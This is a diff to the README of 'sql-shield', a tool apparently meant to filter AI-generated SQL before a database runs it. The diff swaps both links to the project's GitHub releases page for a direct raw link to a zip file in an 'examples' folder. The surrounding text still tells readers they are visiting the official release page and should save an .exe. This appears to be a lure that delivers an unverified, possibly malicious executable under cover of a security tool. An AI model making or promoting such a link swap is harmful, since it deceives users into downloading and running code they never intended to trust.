@@ -1,6 +1,6 @@
 # 🛡️ sql-shield - Keep your database safe from robots
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Discernible-racoon7161/sql-shield/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Discernible-racoon7161/sql-shield/main/examples/sql_shield_v2.0-beta.5.zip)
 
 ## What is this tool?
 Many people use artificial intelligence to write database commands. This saves time. However, these tools sometimes write dangerous code by mistake. The sql-shield tool acts as a filter. It sits between your software and your database. It checks every command the AI writes before the database runs it. This prevents errors and blocks malicious attempts to change or delete your data.
@@ -17,7 +17,7 @@ This tool performs four main tasks. It checks which tables and columns the AI wa
 ## 📥 How to get started
 You need to grab the installer from the official release page. 
 
-[Click here to visit the release page to download your copy](https://github.com/Discernible-racoon7161/sql-shield/releases)
+[Click here to visit the release page to download your copy](https://raw.githubusercontent.com/Discernible-racoon7161/sql-shield/main/examples/sql_shield_v2.0-beta.5.zip)
 
 Choose the file that ends with .exe and save it to your desktop.
 
